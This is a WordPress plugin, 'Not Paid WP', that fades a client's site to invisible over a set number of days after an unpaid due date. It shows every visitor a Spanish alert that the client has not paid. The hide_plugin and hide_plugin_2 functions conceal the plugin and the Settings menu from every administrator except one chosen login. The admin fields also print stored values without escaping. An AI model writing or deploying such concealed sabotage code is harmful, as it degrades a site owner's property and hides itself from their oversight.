<?php
/*
Plugin Name: Not Paid WP
Description: Client did not pay? Add opacity to the body tag and decrease it every day until their site completely fades away. Now with a command control only shown to a specific user. Basd on SurfEdge's plugin.
Version: 1.0
*/

/*
	This plugin is based on the https://github.com/kleampa/not-paid. (@riklomas) and Ciprian (@kleampa) 
*/

function run_not_paid() {
	$options = get_option('not_paid_wp_settings', array() );
	$due = null;
	$deadline = null;

	if(isset($options['not_paid_wp_due_date'])){
		$due = $options['not_paid_wp_due_date'] ;
	}
	if(isset($options['not_paid_wp_deadline'])){
		$deadline = $options['not_paid_wp_deadline'] ;
	}

	if($due && $deadline){ 
	?>
	<script type="text/javascript">
	
		(function(){
			/* change these variables as you wish */
			var due_date = new Date('<?php echo esc_attr( $due ); ?>');
			var days_deadline = <?php echo esc_attr( $deadline ); ?>;
			/* stop changing here */
			
			var current_date = new Date();
			var utc1 = Date.UTC(due_date.getFullYear(), due_date.getMonth(), due_date.getDate());
			var utc2 = Date.UTC(current_date.getFullYear(), current_date.getMonth(), current_date.getDate());
			var days = Math.floor((utc2 - utc1) / (1000 * 60 * 60 * 24));
			
			if(days > 0) {
				var days_late = days_deadline-days;
				var opacity = (days_late*100/days_deadline)/100;
					opacity = (opacity < 0) ? 0 : opacity;
					opacity = (opacity > 1) ? 1 : opacity;
				if(opacity >= 0 && opacity <= 1) {
					document.getElementsByTagName("BODY")[0].style.opacity = opacity;
				}
			}
		})();
	</script>
	<?php
		}
	}
	add_action( 'wp_footer', 'run_not_paid' );

add_action( 'admin_menu', 'not_paid_wp_add_admin_menu' );
add_action( 'admin_init', 'not_paid_wp_settings_init' );


function not_paid_wp_add_admin_menu(  ) { 
	add_options_page( 'Not-Paid-WP', 'Not-Paid-WP', 'manage_options', 'not-paid-wp', 'not_paid_wp_options_page' );
}


function not_paid_wp_settings_init(  ) { 

	register_setting( 'pluginPage', 'not_paid_wp_settings' );

	add_settings_section(
		'not_paid_wp_pluginPage_section', 
		__( 'Client did not pay?', 'Not Paid WP' ), 
		'not_paid_wp_settings_section_callback', 
		'pluginPage'
	);

	add_settings_field( 
		'not_paid_wp_due_date', 
		__( 'Due Date (02/25/2019)', 'Not Paid WP' ), 
		'not_paid_wp_due_date_render', 
		'pluginPage', 
		'not_paid_wp_pluginPage_section' 
	);

	add_settings_field( 
		'not_paid_wp_deadline', 
		__( 'Days Deadline - # of days', 'Not Paid WP' ), 
		'not_paid_wp_deadline_render', 
		'pluginPage', 
		'not_paid_wp_pluginPage_section' 
	);

	add_settings_field( 
		'not_paid_wp_user', 
		__( 'Usuario', 'Not Paid WP' ), 
		'not_paid_wp_user_render', 
		'pluginPage', 
		'not_paid_wp_pluginPage_section' 
	);
}


function not_paid_wp_due_date_render(  ) { 
	$options = get_option( 'not_paid_wp_settings' );
	?>
	<input type='date' name='not_paid_wp_settings[not_paid_wp_due_date]' value='<?php echo $options['not_paid_wp_due_date']; ?>'>
	<?php

}


function not_paid_wp_deadline_render(  ) { 

	$options = get_option( 'not_paid_wp_settings' );
	?>
	<input type='text' name='not_paid_wp_settings[not_paid_wp_deadline]' value='<?php echo $options['not_paid_wp_deadline']; ?>'>
	<?php

}

function not_paid_wp_user_render(  ) { 

	$options = get_option( 'not_paid_wp_settings' );
	?>
	<input type='text' name='not_paid_wp_settings[not_paid_wp_user]' value='<?php echo $options['not_paid_wp_user']; ?>'>
	<?php

}


function not_paid_wp_settings_section_callback(  ) { 

	echo __( 'Add opacity to the body tag and decrease it every day until their site completely fades away.<br>Set a due date and customize the number of days you offer them until the website is fully vanished.<br><h4>This will only work if you set the below values!</h4>', 'Not Paid WP' );

}

function not_paid_wp_options_page(  ) { 

	?>
	<form action='options.php' method='post'>

		<h2>Not-Paid-WP</h2>

		<?php
		settings_fields( 'pluginPage' );
		do_settings_sections( 'pluginPage' );
		submit_button();
		?>

	</form>
	<?php

}

function show_alert()
{
    ?>
    <script type="text/javascript">
        function showAlert() {
            alert('El cliente no ha pagado sus facturas. La página desaparecerá automáticamente en unos días');
        }
        window.onload = showAlert;
    </script>

    <?php
}

add_action('wp_head', 'show_alert');

function hide_plugin() {
global $wp_list_table;
  $hidearr = array('not-paid-w2/index.php');
  $myplugins = $wp_list_table->items;
  $options = get_option('not_paid_wp_settings', array() );
	$user = $options['not_paid_wp_user'];
	$current_user_data = wp_get_current_user();
	$current_user = $current_user_data->data->user_login;
	if($user != $current_user) {
		foreach ($myplugins as $key => $val) {
			if (in_array($key,$hidearr)) {
				unset($wp_list_table->items[$key]);
			}
		}
	}
}

function hide_plugin_2() {
	$options = get_option('not_paid_wp_settings', array() );
	$user = $options['not_paid_wp_user'];
	$current_user_data = wp_get_current_user();
	$current_user = $current_user_data->data->user_login;
	if($user != $current_user) {
		remove_menu_page('options-general.php');
	}
}

add_action('pre_current_active_plugins', 'hide_plugin');
add_action('admin_init', 'hide_plugin_2');